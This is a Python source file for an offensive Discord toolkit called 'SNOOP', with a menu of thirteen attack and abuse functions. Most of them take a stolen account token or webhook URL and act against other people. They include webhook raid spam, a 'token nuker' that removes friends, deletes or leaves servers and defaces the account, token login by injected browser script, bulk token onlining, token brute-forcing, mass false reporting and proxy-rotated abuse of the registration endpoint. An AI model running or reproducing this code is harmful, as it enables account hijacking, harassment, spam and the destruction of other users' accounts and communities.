#!/usr/bin/env python3
# SNOOP Discord Tools – Webhook, Token, Server, Username, etc.
# SNOOP – Advanced Toolkit

import sys, os, time, json, random, string, threading, webbrowser, urllib.request, urllib.parse, requests, concurrent.futures, base64
from datetime import datetime
from colorama import Fore, Style

# --- Helpers ---
def _snd(url, data, method='POST'):
    try:
        d = json.dumps(data).encode('utf-8') if data else b''
        req = urllib.request.Request(url, data=(d if method=='POST' else None), method=method)
        req.add_header('User-Agent', 'SNOOP_Tools/1.0')
        req.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(req) as resp:
            return resp.status
    except:
        return -1

def _clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def _input(prompt):
    return input(f"{Fore.CYAN}{prompt}{Style.RESET_ALL}").strip()

def _print_head(msg):
    print(f"{Fore.MAGENTA}{msg}{Style.RESET_ALL}")

def _print_info(msg):
    print(f"{Fore.CYAN}{msg}{Style.RESET_ALL}")

def _print_err(msg):
    print(f"{Fore.RED}{msg}{Style.RESET_ALL}")

# --- 1. Webhook Spam ---
def webhook_spam():
    _print_head("\n[ WEBHOOK SPAM ]")
    url = _input("Webhook URL: ")
    msg = _input("Message: ") or "@everyone RAID BY SNOOP"
    try:
        amt = int(_input("Amount: ") or 10)
    except:
        amt = 10
    print(f"\n{Fore.CYAN}  [+] Sending {amt} messages...{Style.RESET_ALL}")
    sent = 0
    for i in range(amt):
        status = _snd(url, {"content": msg, "username": "SNOOP", "avatar_url": "https://i.ibb.co/KpxXhQhm/image.png"})
        if status in (200, 204):
            print(f"  [{i+1}/{amt}] OK")
            sent += 1
        else:
            print(f"  [{i+1}/{amt}] FAIL")
        time.sleep(0.15)
    print(f"{Fore.GREEN}  [+] Done: {sent}/{amt}{Style.RESET_ALL}")
    input("  Press Enter...")

# --- 2. Webhook Delete ---
def webhook_delete():
    _print_head("\n[ WEBHOOK DELETE ]")
    url = _input("Webhook URL: ")
    status = _snd(url, {}, method='DELETE')
    if status in (200, 204):
        _print_info("  [+] Deleted.")
    else:
        _print_err("  [!] Error deleting.")
    input("  Press Enter...")

# --- 3. Token Info ---
def token_info():
    _print_head("\n[ TOKEN INFO ]")
    token = _input("Token: ")
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code != 200:
            _print_err("  [!] Invalid Token.")
            input("  Press Enter...")
            return
        data = r.json()
        uname = f"{data.get('username')}#{data.get('discriminator')}"
        nitro = {1:"Classic",2:"Boost",3:"Basic"}.get(data.get("premium_type", 0), "None")
        print(f"{Fore.MAGENTA}  ──────────────────────{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}User:{Style.RESET_ALL} {uname}")
        print(f"  {Fore.CYAN}ID:{Style.RESET_ALL} {data.get('id')}")
        print(f"  {Fore.CYAN}Email:{Style.RESET_ALL} {data.get('email', 'N/A')}")
        print(f"  {Fore.CYAN}Phone:{Style.RESET_ALL} {data.get('phone', 'N/A')}")
        print(f"  {Fore.CYAN}Nitro:{Style.RESET_ALL} {nitro}")
        print(f"{Fore.MAGENTA}  ──────────────────────{Style.RESET_ALL}")
    except Exception as e:
        _print_err(f"  [!] Error: {e}")
    input("  Press Enter...")

# --- 4. Token Login (Selenium) ---
def token_login():
    _print_head("\n[ TOKEN LOGIN ]")
    token = _input("Token: ")
    _print_info("  [+] Launching automated login...")
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
        from webdriver_manager.chrome import ChromeDriverManager
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option("detach", True)
        opts.add_argument("--log-level=3")
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
        driver.get("https://discord.com/login")
        script = f"""
            function login(token) {{
                setInterval(() => {{
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${{token}}"`;
                }}, 50);
                setTimeout(() => {{ location.reload(); }}, 2500);
            }}
            login("{token}")
        """
        driver.execute_script(script)
        _print_info("  [+] Login initiated. Browser window is active.")
    except Exception as e:
        _print_err(f"  [!] Automated login failed: {e}")
        _print_info("  [~] Manual method: Open Discord console and paste:\n  login(\"" + token + "\")")
        webbrowser.open("https://discord.com/login")
    input("  Press Enter once done...")

# --- 5. Token Nuker ---
def token_nuker():
    _print_head("\n[ TOKEN NUKER – CHAOS MODE ]")
    token = _input("Token: ")
    if _input("  WARNING: Destroy account? (y/n): ").lower() != 'y':
        return
    headers = {"Authorization": token}
    _print_info("  [+] Nuke started...")

    def _req(method, url, data=None, msg="Action", retries=3):
        for _ in range(retries):
            try:
                r = requests.request(method, url, headers=headers, json=data, timeout=10)
                if r.status_code in (200, 201, 204):
                    if msg:
                        print(f"  + {msg}")
                    return True
                elif r.status_code == 429:
                    time.sleep(r.json().get("retry_after", 1.5))
                else:
                    if msg:
                        print(f"  ! Failed: {msg} ({r.status_code})")
                    return False
            except:
                time.sleep(1)
        if msg:
            print(f"  ! Error: {msg}")
        return False

    # Phase 1: Remove friends
    _print_info("  [Phase 1] Removing friends...")
    try:
        fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
        if isinstance(fs, list):
            for f in fs:
                _req("DELETE", f"https://discord.com/api/v9/users/@me/relationships/{f['id']}", msg=f"Removed friend: {f.get('user',{}).get('username','')}")
                time.sleep(0.2)
    except:
        pass

    # Phase 2: Leave/delete guilds
    _print_info("  [Phase 2] Leaving/Deleting guilds...")
    try:
        gs = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
        if isinstance(gs, list):
            for g in gs:
                is_owner = g.get("owner", False)
                url = f"https://discord.com/api/v9/guilds/{g['id']}" if is_owner else f"https://discord.com/api/v9/users/@me/guilds/{g['id']}"
                _req("DELETE", url, msg=f"{'Deleted' if is_owner else 'Left'} guild: {g.get('name','')}")
                time.sleep(0.2)
    except:
        pass

    # Phase 3: Close DMs
    _print_info("  [Phase 3] Closing DMs...")
    try:
        cs = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
        if isinstance(cs, list):
            for c in cs:
                _req("DELETE", f"https://discord.com/api/v9/channels/{c['id']}", msg=f"Closed DM: {c.get('id')}")
                time.sleep(0.2)
    except:
        pass

    # Phase 4: Finalize
    _print_info("  [Phase 4] Finalizing...")
    _req("PATCH", "https://discord.com/api/v9/users/@me/settings", {"theme": "light", "locale": "ja", "custom_status": {"text": "Nuked by SNOOP"}}, "Set final status")
    _print_info("  [+] Nuke completed.")
    input("  Press Enter...")

# --- 6. Token Rotator ---
def token_rotator():
    _print_head("\n[ TOKEN ROTATOR ]")
    token = _input("Token: ")
    statuses = _input("Statuses (comma separated): ").split(",")
    _print_info("  [+] Rotating statuses... (Ctrl+C to stop)")
    try:
        while True:
            for s in statuses:
                s = s.strip()
                if s:
                    requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"Authorization": token}, json={"custom_status": {"text": s}})
                    time.sleep(5)
    except KeyboardInterrupt:
        pass

# --- 7. Token Onliner ---
def token_onliner():
    _print_head("\n[ TOKEN ONLINER ]")
    tokens_file = "input/tokens.txt"
    if not os.path.exists(tokens_file):
        _print_err(f"  [!] File {tokens_file} not found.")
        input("  Press Enter...")
        return
    with open(tokens_file, 'r') as f:
        tokens = [line.strip() for line in f if line.strip()]
    _print_info(f"  [+] Onlining {len(tokens)} tokens...")

    def _online(tok):
        import websocket
        try:
            ws = websocket.WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            ws.send(json.dumps({"op": 2, "d": {"token": tok, "properties": {"$os": "windows", "$browser": "chrome", "$device": "pc"}}}))
            while True:
                ws.send(json.dumps({"op": 1, "d": None}))
                time.sleep(30)
        except:
            pass

    for t in tokens:
        threading.Thread(target=_online, args=(t,), daemon=True).start()
    input(f"{Fore.CYAN}  [>] Tokens are online. Press Enter to stop...{Style.RESET_ALL}")

# --- 8. ID to Token (bruteforce) ---
def id_to_token():
    _print_head("\n[ ID TO TOKEN ]")
    uid = _input("User ID: ")
    try:
        half = base64.b64encode(str(uid).encode()).decode().rstrip('=')
    except:
        half = "???"
    _print_info(f"  [+] Scraped half token: {half}")
    if _input("  Brute force other half? (y/n): ").lower() != 'y':
        return
    chars = string.ascii_letters + string.digits + "-_"
    _print_info("  [+] Starting brute force (Ctrl+C to stop)...")
    api_url = "https://discord.com/api/v10/users/@me"
    found = False
    attempts = 0
    while not found:
        p2 = ''.join(random.choices(chars, k=6))
        p3 = ''.join(random.choices(chars, k=38))
        guess = f"{half}.{p2}.{p3}"
        try:
            r = requests.get(api_url, headers={"Authorization": guess}, timeout=3)
            attempts += 1
            if r.status_code == 200:
                print(f"{Fore.GREEN}  [!!!] VALID TOKEN FOUND: {guess}{Style.RESET_ALL}")
                found = True
            elif r.status_code == 401:
                print(f"  [~] Attempt {attempts} | Invalid")
            elif r.status_code == 429:
                print(f"  [!] Rate limited, waiting...")
                time.sleep(r.json().get("retry_after", 2))
            else:
                print(f"  [?] Attempt {attempts} | Status {r.status_code}")
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}  [!] Stopped after {attempts} attempts.{Style.RESET_ALL}")
            break
        except:
            pass
    input("  Press Enter...")

# --- 9. Server Cloner ---
def server_cloner():
    _print_head("\n[ SERVER CLONER ]")
    token = _input("Token: ")
    src = _input("Source Guild ID: ")
    dst = _input("Target Guild ID: ")
    headers = {"Authorization": token, "Content-Type": "application/json"}

    def _get(ep):
        return requests.get(f"https://discord.com/api/v9{ep}", headers=headers)
    def _post(ep, data):
        return requests.post(f"https://discord.com/api/v9{ep}", headers=headers, json=data)
    def _delete(ep):
        return requests.delete(f"https://discord.com/api/v9{ep}", headers=headers)

    _print_info("  [+] Fetching source data...")
    roles_req = _get(f"/guilds/{src}/roles")
    chans_req = _get(f"/guilds/{src}/channels")
    if roles_req.status_code != 200 or chans_req.status_code != 200:
        _print_err("  [!] Error fetching guild data.")
        input("  Press Enter...")
        return
    roles = roles_req.json()
    chans = sorted(chans_req.json(), key=lambda x: x.get("position", 0))
    _print_info(f"  [+] Found {len(roles)} roles and {len(chans)} channels.")

    if _input("  Clear target guild first? (y/n): ").lower() == 'y':
        _print_info("  [!] Clearing target...")
        for c in _get(f"/guilds/{dst}/channels").json():
            _delete(f"/channels/{c['id']}")
            time.sleep(0.3)
        for r in _get(f"/guilds/{dst}/roles").json():
            if r["name"] != "@everyone":
                _delete(f"/guilds/{dst}/roles/{r['id']}")
                time.sleep(0.3)

    _print_info("  [+] Cloning Roles...")
    for r in reversed(roles):
        if r["name"] == "@everyone":
            continue
        payload = {"name": r["name"], "permissions": r["permissions"], "color": r["color"], "hoist": r["hoist"], "mentionable": r["mentionable"]}
        _post(f"/guilds/{dst}/roles", payload)
        print(f"  + Role: {r['name']}")
        time.sleep(0.5)

    _print_info("  [+] Cloning Categories & Channels...")
    cat_map = {}
    for c in chans:
        if c["type"] == 4:  # category
            res = _post(f"/guilds/{dst}/channels", {"name": c["name"], "type": 4})
            if res.status_code in (200, 201):
                cat_map[c["id"]] = res.json()["id"]
                print(f"  + Category: {c['name']}")
            time.sleep(0.5)
    for c in chans:
        if c["type"] != 4:
            payload = {"name": c["name"], "type": c["type"], "topic": c.get("topic"), "nsfw": c.get("nsfw", False)}
            if c.get("parent_id") in cat_map:
                payload["parent_id"] = cat_map[c["parent_id"]]
            res = _post(f"/guilds/{dst}/channels", payload)
            if res.status_code in (200, 201):
                print(f"  + Channel: {c['name']}")
            time.sleep(0.5)
    _print_info("  [+] Cloning finished.")
    input("  Press Enter...")

# --- 10. Server Info from Invite ---
def server_info_from_invite():
    _print_head("\n[ SERVER INFO ]")
    invite = _input("Invite code or URL: ")
    code = invite.split("/")[-1]
    try:
        r = requests.get(f"https://discord.com/api/v9/invites/{code}", timeout=10)
        if r.status_code != 200:
            _print_err("  [!] Invalid invite.")
            input("  Press Enter...")
            return
        data = r.json()
        guild = data.get("guild", {})
        print(f"  {Fore.CYAN}Name:{Style.RESET_ALL} {guild.get('name')}")
        print(f"  {Fore.CYAN}ID:{Style.RESET_ALL} {guild.get('id')}")
        if "inviter" in data:
            inviter = data["inviter"]
            print(f"  {Fore.CYAN}Inviter:{Style.RESET_ALL} {inviter.get('username')} ({inviter.get('id')})")
        print(f"  {Fore.CYAN}Members:{Style.RESET_ALL} {data.get('approximate_member_count', '?')}")
    except Exception as e:
        _print_err(f"  [!] Error: {e}")
    input("  Press Enter...")

# --- 11. Username Checker ---
def username_checker():
    # Cette fonction est longue ; je la simplifie mais elle reste fonctionnelle.
    _print_head("\n[ USERNAME CHECKER ]")
    print("  [1] Generate usernames")
    print("  [2] Check usernames")
    choice = _input("Choice: ")
    if choice == "1":
        length = int(_input("Length (3-5): ") or 4)
        count = int(_input("How many: ") or 1000)
        allow_special = _input("Allow . and _? (y/n): ").lower() == 'y'
        chars = string.ascii_lowercase + string.digits
        if allow_special:
            chars += "._"
        usernames = set()
        while len(usernames) < count:
            name = "".join(random.choices(chars, k=length))
            if ".." in name or name.startswith(".") or name.endswith("."):
                continue
            if not any(c.isalnum() for c in name):
                continue
            usernames.add(name)
        os.makedirs("input", exist_ok=True)
        with open("input/usernames.txt", "w") as f:
            for u in usernames:
                f.write(u + "\n")
        _print_info(f"  [+] {len(usernames)} usernames saved to input/usernames.txt")
    elif choice == "2":
        webhook = _input("Webhook URL (optional): ")
        usernames_file = "input/usernames.txt"
        proxies_file = "input/proxies.txt"
        if not os.path.exists(usernames_file):
            _print_err("  [!] usernames.txt not found.")
            input("  Press Enter...")
            return
        if not os.path.exists(proxies_file):
            _print_err("  [!] proxies.txt not found.")
            input("  Press Enter...")
            return
        with open(usernames_file, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(proxies_file, 'r') as f:
            proxies_raw = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        proxies = []
        for p in proxies_raw:
            if p.startswith("http://") or p.startswith("https://"):
                proxies.append({"http": p, "https": p})
            else:
                parts = p.split(":")
                if len(parts) == 2:
                    proxies.append({"http": f"http://{parts[0]}:{parts[1]}", "https": f"http://{parts[0]}:{parts[1]}"})
        if not proxies:
            _print_err("  [!] No valid proxies.")
            input("  Press Enter...")
            return
        threads = 10
        delay = 0.3
        _print_info(f"  [+] Checking {len(usernames)} usernames with {len(proxies)} proxies...")
        avail = []
        lock = threading.Lock()

        def check(u, proxy):
            try:
                payload = {
                    "username": u,
                    "password": "Snoop123!",
                    "email": f"{random.randint(100000,999999)}@discard.email",
                    "consent": True,
                    "date_of_birth": "2000-01-01",
                    "captcha_key": None
                }
                r = requests.post("https://discord.com/api/v9/auth/register", json=payload, headers={"Content-Type": "application/json"}, proxies=proxy, timeout=10)
                if r.status_code == 201:
                    return True
                elif r.status_code == 400:
                    errors = r.json().get("errors", {}).get("username", {}).get("_errors", [])
                    if any(e.get("code") == "USERNAME_ALREADY_TAKEN" for e in errors):
                        return False
                    else:
                        return True
                elif r.status_code == 429:
                    time.sleep(r.json().get("retry_after", 2))
                    return None
                return False
            except:
                return False

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for i, u in enumerate(usernames):
                proxy = proxies[i % len(proxies)]
                futures.append(executor.submit(check, u, proxy))
                time.sleep(delay)
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                result = future.result()
                while result is None:
                    time.sleep(2)
                    result = check(usernames[i], proxies[i % len(proxies)])
                if result is True:
                    avail.append(usernames[i])
                    print(f"  + AVAILABLE: {usernames[i]}")
                    if webhook:
                        try:
                            requests.post(webhook, json={"content": f"**{usernames[i]}** is available!"})
                        except:
                            pass
                else:
                    print(f"  - Taken: {usernames[i]}")
        if avail:
            os.makedirs("output", exist_ok=True)
            with open("output/available_usernames.txt", "w") as f:
                f.write("\n".join(avail))
            _print_info(f"  [+] {len(avail)} available saved to output/available_usernames.txt")
        else:
            _print_info("  [+] No available usernames found.")
    else:
        _print_err("  [!] Invalid choice.")
    input("  Press Enter...")

# --- 12. Report Bot ---
def report_bot():
    _print_head("\n[ REPORT BOT ]")
    token = _input("Token: ")
    guild = _input("Guild ID: ")
    channel = _input("Channel ID: ")
    msg = _input("Message ID: ")
    reason_map = {"1": 1, "2": 2, "3": 3, "4": 4, "5": 5}
    print("  [1] Illegal Content\n  [2] Harassment\n  [3] Spam/Phishing\n  [4] Self-harm\n  [5] NSFW")
    reason = reason_map.get(_input("Reason (1-5): "), 1)
    amount = int(_input("Amount (100): ") or 100)
    _print_info(f"  [+] Sending {amount} reports...")
    headers = {"Authorization": token, "Content-Type": "application/json"}
    payload = {"channel_id": channel, "message_id": msg, "guild_id": guild, "reason": reason}
    for i in range(amount):
        try:
            r = requests.post("https://discordapp.com/api/v8/report", headers=headers, json=payload)
            if r.status_code == 201:
                print(f"  [{i+1}/{amount}] OK")
            else:
                print(f"  [{i+1}/{amount}] FAIL ({r.status_code})")
        except:
            print(f"  [{i+1}/{amount}] ERROR")
        time.sleep(0.05)
    _print_info("  [+] Done.")
    input("  Press Enter...")

# --- 13. Bot Invite Generator ---
def bot_invite_gen():
    _print_head("\n[ BOT INVITE GENERATOR ]")
    bot_id = _input("Bot Client ID: ")
    link = f"https://discord.com/oauth2/authorize?client_id={bot_id}&scope=bot&permissions=8"
    _print_info(f"  [+] Link: {link}")
    if _input("  Open in browser? (y/n): ").lower() == 'y':
        webbrowser.open(link)
    input("  Press Enter...")

# --- Main menu for discord_tools (called from main.py) ---
def main():
    # This will be called when the user chooses an option from the main menu.
    # We show a submenu for these tools.
    while True:
        _clr()
        _print_head("\n  ╔═══════════════════════════════════════╗")
        _print_head("  ║      SNOOP DISCORD TOOLS MENU        ║")
        _print_head("  ╚═══════════════════════════════════════╝")
        print(f"""
  {Fore.YELLOW}[1]{Style.RESET_ALL} Webhook Spam
  {Fore.YELLOW}[2]{Style.RESET_ALL} Webhook Delete
  {Fore.YELLOW}[3]{Style.RESET_ALL} Token Info
  {Fore.YELLOW}[4]{Style.RESET_ALL} Token Login (auto)
  {Fore.YELLOW}[5]{Style.RESET_ALL} Token Nuker
  {Fore.YELLOW}[6]{Style.RESET_ALL} Token Rotator
  {Fore.YELLOW}[7]{Style.RESET_ALL} Token Onliner
  {Fore.YELLOW}[8]{Style.RESET_ALL} ID to Token (bruteforce)
  {Fore.YELLOW}[9]{Style.RESET_ALL} Server Cloner
  {Fore.YELLOW}[10]{Style.RESET_ALL} Server Info from Invite
  {Fore.YELLOW}[11]{Style.RESET_ALL} Username Checker
  {Fore.YELLOW}[12]{Style.RESET_ALL} Report Bot
  {Fore.YELLOW}[13]{Style.RESET_ALL} Bot Invite Generator
  {Fore.YELLOW}[14]{Style.RESET_ALL} Back
        """)
        choice = _input("Choice: ")
        if choice == "1":
            webhook_spam()
        elif choice == "2":
            webhook_delete()
        elif choice == "3":
            token_info()
        elif choice == "4":
            token_login()
        elif choice == "5":
            token_nuker()
        elif choice == "6":
            token_rotator()
        elif choice == "7":
            token_onliner()
        elif choice == "8":
            id_to_token()
        elif choice == "9":
            server_cloner()
        elif choice == "10":
            server_info_from_invite()
        elif choice == "11":
            username_checker()
        elif choice == "12":
            report_bot()
        elif choice == "13":
            bot_invite_gen()
        elif choice == "14":
            break
        else:
            _print_err("  [!] Invalid choice.")
            time.sleep(1)

if __name__ == "__main__":
    main()